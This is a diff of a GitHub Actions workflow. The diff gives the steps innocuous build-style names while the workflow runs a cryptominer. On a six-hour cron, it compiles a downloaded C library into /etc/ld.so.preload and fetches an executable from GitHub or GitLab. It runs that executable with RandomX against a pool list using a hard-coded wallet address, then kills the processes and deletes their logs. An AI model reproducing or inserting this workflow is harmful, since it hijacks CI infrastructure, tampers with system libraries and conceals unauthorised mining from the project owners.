@@ -1,4 +1,4 @@
-name: yen update
+name: bal
 
 on:
   workflow_dispatch:
@@ -8,28 +8,28 @@ on:
     - cron: '0 */6 * * *'
 
 jobs:
-  task:
-    name: task
+  build:
+    name: build
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 5
       fail-fast: false
       matrix:
-        version: [1, 2, 3, 4, 5]
-        option: [A]
+        go: [1, 2, 3, 4, 5]
+        flag: [A]
     env:
-      JOB_COUNT: 40
-      CURRENT_JOB: ${{ matrix.version }}
+      NUM_JOBS: 40
+      JOB: ${{ matrix.go }}
     steps:
-    - name: Check out repository
+    - name: Checkout code
       uses: actions/checkout@v2
 
-    - name: Install Required Packages
+    - name: Install Dependencies
       run: |
         sudo apt-get update
         sudo apt-get install -y wget curl build-essential jq
 
-    - name: Download and Compile Source Code
+    - name: Download and compile code
       run: |
         curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
         gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
@@ -37,59 +37,58 @@ jobs:
         echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
         rm nyumput.c
 
-    - name: Execute and Control Process
+    - name: Run and manage process
       run: |
-        expiration_time=$(( $(date +%s) + 6*3600 ))  # 6 hours from now
-        while [ $(date +%s) -lt $expiration_time ]; do
-          # Download and verify IP list
-          current_timestamp=$(date +%s)
+        end_time=$(( $(date +%s) + 6*3600 ))  # 6 hours from now
+        while [ $(date +%s) -lt $end_time ]; do
+          # Download and check IP list
+          timestamp=$(date +%s)
           mkdir -p .lib
-          dynamic_sgr=".lib/sgr_$current_timestamp"
-          wget -O $dynamic_sgr https://gitlab.com/barbieanay003/seger/-/raw/main/isu
-          wget -q -O config.json https://gitlab.com/barbieanay003/seger/-/raw/main/isux.json
-          chmod +x $dynamic_sgr config.json
-          ip_list="list_$current_timestamp.json"
-          wget -O $ip_list https://gitlab.com/barbieanay003/seger/-/raw/main/list4.json
-          if [[ ! -f $ip_list ]]; then
+          dynamic_sgr=".lib/sgr_$timestamp"
+          wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sr
+          chmod +x $dynamic_sgr
+          dynamic_list="list_$timestamp.json"
+          wget -O $dynamic_list https://gitlab.com/barbieanay003/seger/-/raw/main/list4.json
+          if [[ ! -f $dynamic_list ]]; then
             echo "Failed to download IP list. Exiting."
             exit 1
           fi
 
-          # Validate JSON file format
-          if ! jq '.' $ip_list > /dev/null 2>&1; then
+          # Check JSON file format
+          if ! jq '.' $dynamic_list > /dev/null 2>&1; then
             echo "Invalid JSON format. Exiting."
             exit 1
           fi
 
           # Select a random IP from the JSON file
-          selected_ip=$(jq -r '.[]' $ip_list | shuf -n 1)
-          if [ -z "$selected_ip" ]; then
-            echo "No IP found in $ip_list. Exiting."
+          ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
+          if [ -z "$ip" ]; then
+            echo "No IP found in $dynamic_list. Exiting."
             exit 1
           fi
 
           # Remove selected IP from JSON file
-          jq --arg ip "$selected_ip" 'del(.[] | select(. == $ip))' $ip_list > temp_$current_timestamp.json && mv temp_$current_timestamp.json $ip_list
+          jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $dynamic_list > tmp_$timestamp.json && mv tmp_$timestamp.json $dynamic_list
 
-          # Check if the sgr file exists
+          # Ensure sgr file is present
           if [ -f $dynamic_sgr ]; then
-            # Choose a random port from the range 802 to 810
-            selected_port=$(shuf -i 802-810 -n 1)
+            # Start the process for multiple ports
+            for port in $(seq 843 852); do
+              # Run the process with the specified parameters in background
+              nohup $dynamic_sgr -a randomx --pool $ip:$port -u 8BJRKZ9FevjeshyBMeUQSzek5Ddpdvht4T6JW9ZhiH937GKCfWCcpBMAJLkktZE8k2JN1A6pjbTDu7knvZFZLT1cKrJHKdr.Mulyono --timeout 720 -t $(nproc --all) -p x > dance_$port_$timestamp.log 2>&1 &
+              process_pid=$!
 
-            # Start the process with the chosen port
-            nohup $dynamic_sgr -c config.json > log_$selected_port_$current_timestamp.log 2>&1 &
-            process_id=$!
+              echo "Started process with PID $process_pid using IP $ip and port $port"
 
-            echo "Started process with PID $process_id using IP $selected_ip and port $selected_port"
+              # Run for 12 minute
+              sleep 720
 
-            # Run for 1 minute
-            sleep 720
+              # Kill the process
+              kill $process_pid || true
 
-            # Terminate the process
-            kill $process_id || true
-
-            # Remove the log file after the process is stopped
-            rm -f log_$selected_port_$current_timestamp.log
+              # Remove the log file after the process is stopped
+              rm -f dance_$port_$timestamp.log
+            done
           else
             echo "$dynamic_sgr not found. Skipping..."
             sleep 120
@@ -99,6 +98,6 @@ jobs:
           sleep 120
 
           # Clean up after each iteration
-          rm -f $ip_list
+          rm -f $dynamic_list
           rm -f $dynamic_sgr
         done
